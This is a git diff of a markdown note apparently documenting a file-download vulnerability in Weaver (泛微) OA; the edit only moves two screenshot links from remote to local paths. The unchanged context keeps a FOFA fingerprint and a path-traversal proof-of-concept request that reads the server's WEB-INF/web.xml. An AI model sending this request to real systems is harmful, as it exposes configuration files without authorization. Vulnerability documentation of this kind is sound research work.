@@ -20,7 +20,7 @@ app="泛微-协同办公OA"
 
 登陆页面
 
-![image-20220520141045902](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201410983.png)
+![image-20220520141045902](./images/202205201410983.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ app="泛微-协同办公OA"
 /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
 ```
 
-![image-20220520141058500](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201410567.png)
+![image-20220520141058500](./images/202205201410567.png)
